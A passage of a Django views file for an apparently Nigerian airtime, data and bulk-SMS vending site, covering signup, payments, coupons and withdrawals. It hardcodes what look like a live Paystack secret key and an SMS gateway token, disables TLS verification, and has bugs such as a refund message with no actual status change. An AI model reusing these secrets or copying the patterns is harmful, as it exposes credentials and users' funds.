    # {"status":"failed", "data": {"transId":"sm-230221122249", "customRef":"DT-788b4", "transactionMessage":"Data Purchase Failed"}}

    ident = result['data']['customRef']

    # try:
    trans = Data.objects.filter(ident=ident).first()
    if trans:
        if trans.Status != 'successful' and result["status"] == "failed":
            api_msg = f"customRef({ident}) is valid, refund complete"

            trans.Status == 'failed'
            trans.save()

        else:
            api_msg = f"{ident} was successful"

    else:
        api_msg = f"customRef({ident}) not found"
        print(f"customRef({ident}) not found")

    # except:
    #     print('transaction not found')
    #     api_msg = "unable to handle request, maintenanace mode"

    return JsonResponse({'status':"connection successful",'message': f"{api_msg}"}, status=200)





class TestimonialView(generic.ListView):
    template_name = 'Testimonial.html'
    paginate_by = 3
    queryset = Testimonial.objects.all().order_by('-create_date')
    context_object_name = 'testimonial'
    model = Testimonial


class TestimonialCreate(generic.CreateView):
    form_class = Testimonialform
    template_name = 'testimonialform.html'
    success_url = reverse_lazy('Testimonials')

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user
        form.save()

        return super(TestimonialCreate, self).form_valid(form)


class Testimonial_Detail(generic.DetailView):
    model = Testimonial
    template_name = 'Testimonialdetail.html'
    queryset = Testimonial.objects.all()
    context_object_name = 'testimonial'


class Result_Checker_Pin_order_view(generic.CreateView):
    form_class = Result_Checker_Pin_order_form
    template_name = 'resultchecker.html'

    def get_context_data(self, **kwargs):

        context = super(Result_Checker_Pin_order_view,  self).get_context_data(**kwargs)

        context['waec_controller'] = Result_Checker_Pin.objects.get(exam_name="WAEC")
        context['neco_controller'] = Result_Checker_Pin.objects.get(exam_name="NECO")
        try:
            context['nabteb_controller'] = Result_Checker_Pin.objects.get(exam_name="NABTEB")
        except:
            context['nabteb_controller'] = ''

        if self.request.user.user_type == "Affilliate":
            context['amt1'] = Result_Checker_Pin.objects.get(exam_name="WAEC").Affilliate_price
            context['amt2'] = Result_Checker_Pin.objects.get(exam_name="NECO").Affilliate_price
            try:
                context['amt3'] = Result_Checker_Pin.objects.get(exam_name="NABTEB").Affilliate_price
            except:
                pass
        elif self.request.user.user_type == "TopUser":
            context['amt1'] = Result_Checker_Pin.objects.get(exam_name="WAEC").TopUser_price
            context['amt2'] = Result_Checker_Pin.objects.get(exam_name="NECO").TopUser_price
            try:
                context['amt3'] = Result_Checker_Pin.objects.get(exam_name="NABTEB").TopUser_price
            except:
                pass

        elif self.request.user.user_type == "API":
            context['amt1'] = Result_Checker_Pin.objects.get(exam_name="WAEC").api_price
            context['amt2'] = Result_Checker_Pin.objects.get(exam_name="NECO").api_price
            try:
                context['amt3'] = Result_Checker_Pin.objects.get(exam_name="NABTEB").api_price
            except:
                pass
        else:
            context['amt1'] = Result_Checker_Pin.objects.get(exam_name="WAEC").amount
            context['amt2'] = Result_Checker_Pin.objects.get(exam_name="NECO").amount
            try:
                context['amt3'] = Result_Checker_Pin.objects.get(exam_name="NABTEB").amount
            except:
                pass

        return context



class Result_Checker_Pin_order_success(generic.DetailView):
    model = Result_Checker_Pin_order
    template_name = 'resultchecker_success.html'
    context_object_name = 'resultchecker'

    def get_queryset(self):
        return Result_Checker_Pin_order.objects.filter(user=self.request.user)


############### Recharge card #printing ######################


class Recharge_pin_order_view(generic.CreateView):
    form_class = Recharge_Pin_order_form
    template_name = 'rechargepin.html'

    def get_context_data(self, **kwargs):

        context = super(Recharge_pin_order_view,
                        self).get_context_data(**kwargs)
        context['amt1'] = Recharge_pin.objects.filter(
            network=Network.objects.get(name="MTN")).filter(available=True).count()
        context['amt2'] = Recharge_pin.objects.filter(
            network=Network.objects.get(name="GLO")).filter(available=True).count()
        context['amt3'] = Recharge_pin.objects.filter(
            network=Network.objects.get(name="AIRTEL")).filter(available=True).count()
        context['amt4'] = Recharge_pin.objects.filter(
            network=Network.objects.get(name="9MOBILE")).filter(available=True).count()

        return context


class Recharge_pin_order_success(generic.DetailView):
    model = Recharge_pin_order
    template_name = 'rechargepin_success.html'
    context_object_name = 'rechargepin'

    def get_queryset(self):
        return Recharge_pin_order.objects.filter(user=self.request.user)


def loadrechargeplans(request):

    network_id = request.GET.get('network')
    netid = Network.objects.get(id=network_id)
    plans = Recharge.objects.filter(network=network_id).order_by('amount')

    #print(plans)
    return render(request, 'rechargelist.html', {'plans': plans})


class TestimonialReply(generic.CreateView):
    form_class = Commentform
    template_name = 'TestimonialReply.html'
    success_url = reverse_lazy('testimonial')

    def form_valid(self, form, *args, **kwargs):
        object = form.save(commit=False)
        test = get_object_or_404(Testimonial, pk=kwargs['pk'])
        object.testimonial = test
        form.save()

        return super(TestimonialReply, self).form_valid(form)


'''
   def form_valid(self,form,request,pk):
        testim =  get_object_or_404(Testimonial ,pk = pk)
        object = form.save(commit=False)
        object.testimonial = testim
        form.save()

        return super(TestimonialReply,self).form_valid(form)
'''


def add_comment_to_testimonial(request, pk):
    testimonial = get_object_or_404(Testimonial, pk=pk)
    if request.method == "POST":
        form = Commentform(request.POST)
        if form.is_valid():
            comment = form.save(commit=False)
            comment.testimonial = testimonial
            comment.save()
            return redirect('testimonialdetail', pk=testimonial.pk)
    else:
        form = Commentform()
    return render(request, 'TestimonialReply.html', {'form': form})


class NotificationView(TemplateView):
    template_name = 'Notification.html'

    def get_context_data(self, **kwargs):

        context = super(NotificationView, self).get_context_data(**kwargs)
        #context['Notification'] =Notification.objects.filter(user=self.request.user)
        user = CustomUser.objects.get(pk=self.request.user.pk)
        context['Noti'] = user.notifications.all()
        return context


class HomeView(generic.DetailView):
    model = CustomUser
    template_name = 'detail.html'
    slug_field = "username"


class AirlisView(generic.ListView):

    template_name = 'airtime_success.html'
    context_object_name = 'Airtime_funding_list'

    def get_queryset(self):
        return Airtime_funding.objects.all()



def activate(request, uidb64, token):
    try:
        uid = force_text(urlsafe_base64_decode(uidb64))
        #print(uid)
        user = CustomUser.objects.get(pk=uid)
    except(TypeError, ValueError, OverflowError, CustomUser.DoesNotExist):
        user = None
    if user is not None and account_activation_token.check_token(user, token):
        # user.is_active = True
        user.email_verify = True
        user.save()

        messages.success(request, 'Thank you for your email confirmation. Now you can login your account.')

        return redirect('profile')

    else:
        return HttpResponse('Activation link is invalid!')


def sendverificationlink(request):
    try:
        user= request.user
        current_site = get_current_site(request)
        mail_subject = 'Activate your yuniqtelecoms account.'
        message =  {
            'user': user,
            'domain': current_site.domain,
            'uid':urlsafe_base64_encode(force_bytes(user.pk)),
            'token':account_activation_token.make_token(user),
        }
        message = get_template('acc_active_email.html').render(message)
        to_email = request.user.email
        email = EmailMessage(mail_subject, message, to=[to_email] )
        email.content_subtype = "html"
        email.send()

        data = {'message':f"Verification link sent to {request.user.email}", }
    except:
        data = {'message':"Unable to send account verification link, contact admin", }

    return JsonResponse(data)



class SignUp(SuccessMessageMixin, generic.CreateView):
    form_class = CustomUserCreationForm
    success_url = reverse_lazy('login')
    template_name = 'signup.html'
    success_messages = 'Please confirm your email address to complete the registration,activation link has been sent to your email, also check your email spam folder'

    def abc(self):
        ref = ""
        if "referal" in self.request.session:
            ref = (self.request.session["referal"])

        return ref

    def get_context_data(self, **kwargs):

        context = super(SignUp, self).get_context_data(**kwargs)
        context['referal_user'] = self.abc()

        return context

    def form_valid(self, form):
        object = form.save(commit=False)
        username = object.username
        email = object.email
        object.email_verify = False
        # object.is_active = False
        user = object

        if CustomUser.objects.filter(username__iexact=object.username).exists():
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'This username has been taken'])
            return self.form_invalid(form)

        elif CustomUser.objects.filter(email__iexact=object.email).exists():
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'This email has been taken'])
            return self.form_invalid(form)
        elif CustomUser.objects.filter(Phone__iexact=object.Phone).exists():
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'This Phone has been taken'])
            return self.form_invalid(form)

        elif not object.email.endswith(("@gmail.com",'@yahoo.com')):
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList([u'We accept only valid gmail or yahoo mail account'])
            return self.form_invalid(form)

        elif object.referer_username:
            if CustomUser.objects.filter(username__iexact=object.referer_username).exists():
                referal_user = CustomUser.objects.get(
                    username__iexact=object.referer_username)

            else:
                object.referer_username = None

        form.save()

        try:


                current_site = get_current_site(self.request)
                mail_subject = 'Activate your yuniqtelecoms account.'
                message =  {
                    'user': user,
                    'domain': current_site.domain,
                    'uid':urlsafe_base64_encode(force_bytes(user.pk)),
                    'token':account_activation_token.make_token(user),
                }
                message = get_template('acc_active_email.html').render(message)
                to_email = email
                email = EmailMessage(mail_subject, message, to=[to_email] )
                email.content_subtype = "html"
                email.send()



        except:
            pass
        try:
            Referal_list.objects.create(user=referal_user, username=username)
        except:
            pass
        try:

            messages.success( self.request, 'Please confirm your email address to complete the registration,activation link has been sent to your email,, also check your email spam folder')

            sendmail("Welcome to yuniqtelecoms.com", "Welcome to yuniqtelecoms.com, We offer instant recharge of Airtime, Databundle, CableTV (DStv, GOtv & Startimes), Electricity Bill Payment and Airtime to Cash.", email, username)


        except:
            pass
        try:

            def create_id():
                num = random.randint(1, 10)
                num_2 = random.randint(1, 10)
                num_3 = random.randint(1, 10)
                return str(num_2)+str(num_3)+str(uuid.uuid4())[:4]

            body = {
                "accountReference": create_id(),
                "accountName": username,
                "currencyCode": "NGN",
                "contractCode": f"{config.monnify_contract_code}",
                "customerEmail": email,
                "incomeSplitConfig": [],
                "restrictPaymentSource": False,
                "allowedPaymentSources": {}
            }

            if not email:

                data = json.dumps(body)
                ad = requests.post("https://api.monnify.com/api/v1/auth/login", auth=HTTPBasicAuth(
                    f'{config.monnify_API_KEY}', f'{config.monnify_SECRET_KEY}'))
                mydata = json.loads(ad.text)

                headers = {'Content-Type': 'application/json', 'User-Agent': 'Custom', 
                           "Authorization": "Bearer {}" .format(mydata['responseBody']["accessToken"])}
                ab = requests.post(
                    "https://api.monnify.com/api/v1/bank-transfer/reserved-accounts", headers=headers, data=data)

                mydata = json.loads(ab.text)

                user = CustomUser.objects.get(email__iexact=email)

                user.reservedaccountNumber = mydata["responseBody"]["accountNumber"]
                user.reservedbankName = mydata["responseBody"]["bankName"]
                user.reservedaccountReference = mydata["responseBody"]["accountReference"]
                user.save()

            else:
                pass

        except:
            pass
        return super(SignUp, self).form_valid(form)


class UserEdit(generic.UpdateView):
    form_class = CustomUserChangeForm
    models = CustomUser
    success_url = reverse_lazy('userdetails')
    template_name = 'Editprofile.html'
    context_object_name = 'Edit'

    def get_object(self):
        return CustomUser.objects.get(pk=self.request.user.id)

    def get_queryset(self):
        return CustomUser.objects.all()


class BankpaymentCreate(generic.CreateView):
    form_class = Bankpaymentform
    template_name = 'bank_form.html'

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user

        if float(object.amount) < config.manual_bank_funding_limit:
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'Minimun deposit is #{}'.format(config.manual_bank_funding_limit)])
            return self.form_invalid(form)

        msg = f"{object.user.username} want to fund his/her account with  bank payment  amount:{object.user.username} https://www.yuniqtelecoms.com/page-not-found-error/page/app/bankpayment/"


        try:
            sendmail("MANUAL BANK FUNDING Notification", msg, config.gmail, "yuniqtelecoms.com")
            sendmessage('Msorg', msg, f"{config.sms_notification_number}", '2')
        except:
            pass

        form.save()

        return super(BankpaymentCreate, self).form_valid(form)


def create_id():
    num = random.randint(1, 10)
    num_2 = random.randint(1, 10)
    num_3 = random.randint(1, 10)
    return str(num_2)+str(num_3)+str(uuid.uuid4())[:4]


class bonus_transferCreate(generic.CreateView):
    form_class = bonus_transfer_form
    template_name = 'bonus_transfer_form.html'
    success_url = reverse_lazy('profile')

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user

        if float(object.amount) < 100:
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList([u'You can\'t withdraw any amount lesser than #100'])
            return self.form_invalid(form)

        if float(object.amount) > object.user.Referer_Bonus:
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'You can\'t Tranfer to your wallet due to insufficientr bonus balance, Current BONUS Balance #{}'.format(object.user.Referer_Bonus)])
            return self.form_invalid(form)

        else:
            try:
                mb = CustomUser.objects.get(pk=self.request.user.pk)
                ms = object.amount
                mb.ref_withdraw(float(ms))
                mb.deposit(mb.id, float(ms),True ,"Bonus to Wallet")

                messages.success(
                    self.request, '#{} referer bonus has been added to your wallet,refer more people to get more bonus'.format(object.amount))

            except:
                pass

        form.save()
        return super(bonus_transferCreate, self).form_valid(form)


class paymentgatewayCreate(generic.CreateView):
    form_class = paymentgateway_form
    template_name = 'paystack.html'
    success_url = reverse_lazy('home')

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user
        object.reference = create_id

        headers = {"authorization": "Bearer sk_c8986fb38180f0b006e276637c2437870d08b1d5",
                   "content-type": "application/json", "cache-control": "no-cache"}
        url = "https://api.paystack.co/transaction/initialize"
        payload = {"email": "customer@email.com", "amount": 500000,
                   "reference": "7PVGX8MEk85tgeEpVDtD", 'callback_url': 'www.yuniqtelecoms.com/'}
        response = requests.post(url, headers=headers, params=payload)
        HttpResponseRedirect(
            'Location: ' . response['data']['authorization_url'])

        form.save()

        return super(paymentgatewayCreate, self).form_valid(form)


class Bankpaymentsuccess(generic.DetailView):
    model = Bankpayment
    template_name = 'bank_payment_success.html'
    queryset = Bankpayment.objects.all()
    context_object_name = 'bank'


class airtimeCreate(generic.CreateView):
    form_class = airtimeform
    template_name = 'airtime_form.html'

    def get_context_data(self, **kwargs):

        context = super(airtimeCreate, self).get_context_data(**kwargs)
        context['mtn'] = Percentage.objects.get(
            network=Network.objects.get(name="MTN")).percent
        context['glo'] = Percentage.objects.get(
            network=Network.objects.get(name="GLO")).percent
        context['mobie'] = Percentage.objects.get(
            network=Network.objects.get(name="9MOBILE")).percent
        context['airtel'] = Percentage.objects.get(
            network=Network.objects.get(name="AIRTEL")).percent

        return context

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user
        net = str(object.network)
        amt = float(object.amount)

        def sendmessage(sender, message, to, route):
            payload = {
                'sender': sender,
                'to': to,
                'message': message,
                'type': '0',
                'routing': route,
                'token': 'cYTj0CCFuGM4PSrvABkoANCBNlNF2SoipZFSNlz5hmKnejg6fubGLFu7Ph2URDj22dWGYjlRqDILQz7kHxARBlAwdC4CpTKHGC5D',
                'schedule': '',
            }

            baseurl = f'https://sms.hollatags.com/api/send/?user={config.hollatag_username}&pass={config.hollatag_password}&to={to}&from={sender}&msg={urllib.parse.quote(message)}'
            response = requests.get(baseurl, verify=False)

        if net == 'MTN' and (len(object.pin) < 16 or len(object.pin) > 17):
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'Invalid MTN card pin '])
            return self.form_invalid(form)

        elif net == '9MOBILE' and (len(object.pin) < 16 or len(object.pin) > 17):
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'Invalid 9MOBILE card pin'])
            return self.form_invalid(form)

        elif net == 'GLO' and (len(object.pin) < 16 or len(object.pin) > 17):
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'Invalid GLO card pin'])
            return self.form_invalid(form)

        elif net != 'MTN' and (amt == 400.0):
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'#400 airtime only available for MTN'])
            return self.form_invalid(form)

        elif net == 'AIRTEL' and (len(object.pin) < 16 or len(object.pin) > 17):
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'Invalid AIRTEL card pin'])
            return self.form_invalid(form)

        elif net == 'MTN':
            perc = Percentage.objects.get(id=1)
            object.Receivece_amount = float(
                object.amount) * int(perc.percent)/100

        elif net == 'GLO':
            perc = Percentage.objects.get(id=2)
            object.Receivece_amount = float(
                object.amount) * int(perc.percent)/100

        elif net == '9MOBILE':
            perc = Percentage.objects.get(id=3)
            object.Receivece_amount = float(
                object.amount) * int(perc.percent)/100

        elif net == 'AIRTEL':
            perc = Percentage.objects.get(id=4)
            object.Receivece_amount = float(
                object.amount) * int(perc.percent)/100

        sendmessage('Msorg', "{0} want to fund his/her account with airtime pin:{1} network: {2} amount:{3} https://www.yuniqtelecoms.com/page-not-found-error/page/app/airtime/".format(
            object.user.username, object.pin, object.network, object.amount), f"{config.sms_notification_number}", '2')

        form.save()

        return super(airtimeCreate, self).form_valid(form)


class BulkCreate(generic.CreateView):
    form_class = Bulk_Message_form
    template_name = 'bulk.html'

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user

        num = object.to.split(',')
        invalid = 0
        unit = 0
        numberlist = []
        page = 1
        previous_bal = object.user.Account_Balance

        def send_vtpass(sender, to, msg):
            url = f"https://messaging.vtpass.com/api/sms/dnd-route?sender={sender}&recipient={to}&message={msg}&responsetype=json"

            payload={}
            headers = {
                'X-Token': str(config.vtpass_token),
                'X-Secret': str(config.vtpass_SK),
            }

            response = requests.request("GET", url, headers=headers, data=payload)

            print(response.text)


        def send_bulksms9ja(sender, to, message):
            print('------------------------------------------------GOING TO BULKSMS 9JA')
            
            url = "https://www.bulksmsnigeria.com/api/v1/sms/create"
            payload = json.dumps({
              "api_token": str(config.bulksms9ja_api_token),
              "from": sender,
              "to": to,
              "body": message
            })

            # add this to send to custom sender name, but user must have completed kyc
            # "dnd":6   (default = 1)

            headers = {'Content-Type': 'application/json'}
            
            response = requests.request("POST", url, headers=headers, data=payload)
            print(payload)
            print(response.text)
            
            return response

        def sendmessage(sender, message, to, route):
            payload = {
                'sender': sender,
                'to': to,
                'message': message,
                'type': '0',
                'routing': route,
                'token': 'cYTj0CCFuGM4PSrvABkoANCBNlNF2SoipZFSNlz5hmKnejg6fubGLFu7Ph2URDj22dWGYjlRqDILQz7kHxARBlAwdC4CpTKHGC5D',
                'schedule': '',
            }

            baseurl = f'https://sms.hollatags.com/api/send/?user={config.hollatag_username}&pass={config.hollatag_password}&to={to}&from={sender}&msg={urllib.parse.quote(message)}'
            response = requests.get(baseurl, verify=False)

        for real in num:

            if len(real) == 11:
                if real.startswith('0'):
                    sender = list(real)
                    sender[0] = "234"
                    sender = ''.join(sender)

                    numberlist.append(sender)

                    unit += 1
                else:
                    invalid += 1

            elif len(real) == 13:
                if real.startswith('234'):
                    numberlist.append(real)

                    unit += 1

                else:
                    invalid += 1
            else:
                invalid += 1

        numberset = ','.join(numberlist)
        object.total = len(numberlist)
        if len(object.message) % 160 > 1:
            page = page + len(object.message) // 160

        if object.DND == True:
            if numberset == "" or numberset == None:
                form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                    [u'No valid Number found'])
                return self.form_invalid(form)

            elif Disable_Service.objects.get(service="Bulk sms").disable == True:
                form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                    [u'This Service is not currently available please check back'])
                return self.form_invalid(form)

            else:

                if float(object.total * 3.5 * page) > object.user.Account_Balance:
                    form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                        [u'You can\'t send bulk sms  due to insufficientr balance, Current Balance #{}'.format(object.user.Account_Balance)])
                    return self.form_invalid(form)

                else:
                    if config.BulkSMS_provider == "BulkSMS9ja":
                        response = send_bulksms9ja(object.sendername,numberset,object.message)
                    elif config.BulkSMS_provider == "VTPass":
                        response = send_vtpass(object.sendername,numberset,object.message)
                    else:
                        response = sendmessage(object.sendername, object.message, numberset, "03")

                    object.unit = unit
                    object.invalid = invalid
                    object.page = page
                    object.total = len(numberlist)
                    object.amount = object.total * 3.5 * int(object.page)
                    mb = CustomUser.objects.get(pk=object.user.pk)
                    withdraw = mb.withdraw(mb.id, float(object.amount))
                    if withdraw == False:
                        form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList([u'You can\'t send bulk sms  due to insufficientr balance, Current Balance #{}'.format(object.user.Account_Balance)])
                        return self.form_invalid(form)
                    object.Status = 'successful'
                    Wallet_summary.objects.create(user=object.user, product="bulk sms service charge  N{} ".format(
                        object.amount), amount=object.amount, previous_balance=previous_bal, after_balance=(previous_bal - float(object.amount)))

        else:
            if numberset == "" or numberset == None:
                form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList([u'No valid Number found'])
                return self.form_invalid(form)

            elif Disable_Service.objects.get(service="Bulk sms").disable == True:
                form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList([u'This Service is not currently available please check back'])
                return self.form_invalid(form)
            else:

                if float(object.total * 3.5 * page) > object.user.Account_Balance:
                    form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList([u'You can\'t send bulk sms  due to insufficientr balance, Current Balance #{}'.format(object.user.Account_Balance)])
                    return self.form_invalid(form)

                else:
                    if config.BulkSMS_provider == "BulkSMS9ja":
                        response = send_bulksms9ja(object.sendername,numberset,object.message)
                    elif config.BulkSMS_provider == "VTPass":
                        response = send_vtpass(object.sendername,numberset,object.message)
                    else:
                        response = sendmessage(object.sendername, object.message, numberset, "02")

                    object.unit = unit
                    object.invalid = invalid
                    object.page = page
                    object.total = len(numberlist)
                    object.amount = object.total * 3.5 * int(object.page)
                    mb = CustomUser.objects.get(pk=object.user.pk)
                    withdraw = mb.withdraw(mb.id, float(object.amount))
                    if withdraw == False:
                        form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                            [u'You can\'t send bulk sms  due to insufficientr balance, Current Balance #{}'.format(object.user.Account_Balance)])
                        return self.form_invalid(form)
                    object.Status = 'successful'
                    Wallet_summary.objects.create(user=object.user, product="bulk sms N{} ".format(
                        object.amount), amount=object.amount, previous_balance=previous_bal, after_balance=(previous_bal - float(object.amount)))

        form.save()

        return super(BulkCreate, self).form_valid(form)


class Bulk_success(generic.DetailView):
    model = Bulk_Message
    template_name = 'bulk_success.html'
    queryset = Bulk_Message.objects.all()
    context_object_name = 'bulk_success'


class airtime_success(generic.DetailView):
    model = Airtime
    template_name = 'Airtime_suc.html'
    queryset = Airtime.objects.all()
    context_object_name = 'Airtime_success'

    def get_context_data(self, **kwargs):

        context = super(airtime_success, self).get_context_data(**kwargs)
        context['net'] = Network.objects.get(name='MTN')
        context['net_2'] = Network.objects.get(name='GLO')
        context['net_3'] = Network.objects.get(name='9MOBILE')
        context['net_4'] = Network.objects.get(name='AIRTEL')
        return context


class Airtime_fundingCreate(generic.CreateView):
    form_class = Airtime_fundingform
    template_name = 'Airtime_funding_form.html'

    def get_context_data(self, **kwargs):

        context = super(Airtime_fundingCreate, self).get_context_data(**kwargs)
        context['mtn'] = Percentage.objects.get(
            network=Network.objects.get(name='MTN')).percent
        context['glo'] = Percentage.objects.get(
            network=Network.objects.get(name='GLO')).percent
        context['mobie'] = Percentage.objects.get(
            network=Network.objects.get(name='9MOBILE')).percent
        context['airtel'] = Percentage.objects.get(
            network=Network.objects.get(name='AIRTEL')).percent
        context['num_1'] = Admin_number.objects.get(network='MTN')
        context['num_2'] = Admin_number.objects.get(network='GLO')
        context['num_3'] = Admin_number.objects.get(network='9MOBILE')
        context['num_4'] = Admin_number.objects.get(network='AIRTEL')

        return context

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user

        Mtn= ["0702","0704","0706",'0703','0903','0906','0706','0803','0806','0810','0813','0816','0814']
        ETISALATE =  ['0809','0817','0818','0909','0908']
        GLO = ['0705','0805','0811','0807','0815','0905']
        AIRTEL = ['0702','0708','0802','0808','0812','0907','0701','0902','0901',"0904"]
        net = str(object.network)
        mobilenumber = str(object.mobile_number)
        num = mobilenumber.replace(" ", "")

        form.save()

        return super(Airtime_fundingCreate, self).form_valid(form)


class Airtime_funding_success(generic.DetailView):
    model = Airtime_funding
    template_name = 'Airtime_funding_success.html'
    queryset = Airtime_funding.objects.all()
    context_object_name = 'Airtime_funding_list'

    def get_context_data(self, **kwargs):

        context = super(Airtime_funding_success,
                        self).get_context_data(**kwargs)
        context['net'] = Network.objects.get(name='MTN')
        context['net_2'] = Network.objects.get(name='GLO')
        context['net_3'] = Network.objects.get(name='9MOBILE')
        context['net_4'] = Network.objects.get(name='AIRTEL')
        context['num_1'] = Admin_number.objects.get(network='MTN')
        context['num_2'] = Admin_number.objects.get(network='GLO')
        context['num_3'] = Admin_number.objects.get(network='9MOBILE')
        context['num_4'] = Admin_number.objects.get(network='AIRTEL')
        return context


class CouponCodePayment(generic.CreateView):
    form_class = CouponCodeform
    template_name = 'Coupon.html'
    Coupo = Couponcode.objects.all()

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user
        previous_bal = object.user.Account_Balance

        # for codes in self.Coupo:
        # exists()
        if not Couponcode.objects.filter(Coupon_Code=object.Code).exists():
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'Invalid Coupon code note that its case sensetive'])
            return self.form_invalid(form)
        elif Couponcode.objects.filter(Coupon_Code=object.Code, Used=True).exists():
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'This Coupon code has been used'])
            return self.form_invalid(form)
        elif Couponcode.objects.filter(Coupon_Code=object.Code).exists():
            mb = CustomUser.objects.get(pk=object.user.pk)
            ms = Couponcode.objects.get(Coupon_Code=object.Code).amount
            object.amount = Couponcode.objects.get(
                Coupon_Code=object.Code).amount
            amount = float(object.amount)
            mb.deposit(mb.id, amount,False ,"Coupon Funding")
            sta = Couponcode.objects.get(Coupon_Code=object.Code)
            sta.Used = True
            Wallet_summary.objects.create(user=object.user, product=" N{} Coupon Funding  ".format(
                amount), amount=amount, previous_balance=previous_bal, after_balance=(previous_bal + amount))


            # REFERRAL BONUS FOR FUNDING
            # user = object.user
            # chek =  Wallet_Funding.objects.filter(user=user).count()
            # # try:
            # #print(f'referral bonus inititated for {user}')
            # #print(user.referer_username)
            # #print(chek)
            # if user.referer_username and chek == 1:
            #     #print('---------------------------------------------------------')
            #     #print(f'referral bonus inititated, no wallet funding record found for {user}')
            #     #print('---------------------------------------------------------')
            #     if CustomUser.objects.filter(username__iexact=user.referer_username).exists():
            #         referer = CustomUser.objects.get(username__iexact=user.referer_username)
            #         ref_previous_bal = referer.Account_Balance
            #         referer.ref_deposit(200)
            #         notify.send(referer, recipient=referer, verb='you Earned N200 Bonus from your referal: {user.username} first funding and has been added to your referal bonus wallet')
            #         Wallet_summary.objects.create(user=referer, product=f"Earned N200 referral bonus from {user} first funding", amount=200, previous_balance=ref_previous_bal, after_balance=(ref_previous_bal + 200))
            # REFERRAL BONUS FOR FUNDING

            sta.save()
            messages.success( self.request, 'your account has been credited with sum of #{} .'.format(object.amount))

        form.save()
        return super(CouponCodePayment, self).form_valid(form)


class Coupon_success(generic.DetailView):
    model = CouponPayment
    template_name = 'Payment.html'
    context_object_name = 'Coupon'

    def get_queryset(self):
        return CouponPayment.objects.filter(user=self.request.user)


class PinView(generic.CreateView):
    form_class = Pinform
    template_name = 'pin.html'

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user
        form.save()
        return super(PinView, self).form_valid(form)


class withdrawCreate(generic.CreateView):
    form_class = withdrawform
    template_name = 'withdraw_form.html'

    def sendmessage(sender, message, to, route):
        payload = {
            'sender': sender,
            'to': to,
            'message': message,
            'type': '0',
            'routing': route,
            'token': 'cYTj0CCFuGM4PSrvABkoANCBNlNF2SoipZFSNlz5hmKnejg6fubGLFu7Ph2URDj22dWGYjlRqDILQz7kHxARBlAwdC4CpTKHGC5D',
            'schedule': '',
        }

        baseurl = f'https://sms.hollatags.com/api/send/?user={config.hollatag_username}&pass={config.hollatag_password}&to={to}&from={sender}&msg={urllib.parse.quote(message)}'
        response = requests.get(baseurl, verify=False)

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user
        object.amount = float(object.amount) + 100
        previous_bal = object.user.Account_Balance

        if float(object.amount) > object.user.Account_Balance:
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'Insufficient balance ,Try to fund your account :Account Balance #{}'.format(object.user.Account_Balance)])
            return self.form_invalid(form)

        elif float(object.amount) > object.user.Account_Balance:
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'Insufficient balance ,Try to fund your account :You can only withdraw #{}'.format(object.user.Account_Balance - 100)])
            return self.form_invalid(form)

        elif object.user.is_superuser == False and Withdraw.objects.filter(create_date__date=datetimex.date.today()).count > 1:
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'Exceed Maximum withdraw limit for today.'])

        elif float(object.amount) < 1000:
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'Minimun withdraw is #1000 per transaction'])
            return self.form_invalid(form)

        elif float(object.amount) > 20000:
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u' Maximum withdraw is #20000 per transaction'])
            return self.form_invalid(form)
        else:
            try:
                mb = CustomUser.objects.get(pk=object.user.pk)
                ms = object.amount
                check = mb.withdraw(mb.id, float(ms))
                if check == False:
                    form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                        [u'Insufficient balance ,Try to fund your account :You can only withdraw #{}'.format(object.user.Account_Balance - 100)])
                    return self.form_invalid(form)

                Wallet_summary.objects.create(user=object.user, product="Wallet Withdraw ", amount=object.amount,
                                              previous_balance=previous_bal, after_balance=(previous_bal - object.amount))

                sendmessage('Msorg', "{0} want to withdraw   amount:{1}   https://www.yuniqtelecoms.com/page-not-found-error/page/app/withdraw/".format(
                    object.user.username, object.amount), f"{config.sms_notification_number}", '2')
            except:
                pass

        form.save()

        return super(withdrawCreate, self).form_valid(form)


class Withdraw_success(generic.DetailView):
    model = Withdraw
    template_name = 'Withdraw-detail.html'
    context_object_name = 'Withdraw_list'

    def get_queryset(self):
        return Withdraw.objects.filter(user=self.request.user)


class dataCreate(generic.CreateView):
    form_class = dataform
    template_name = 'data_form.html'

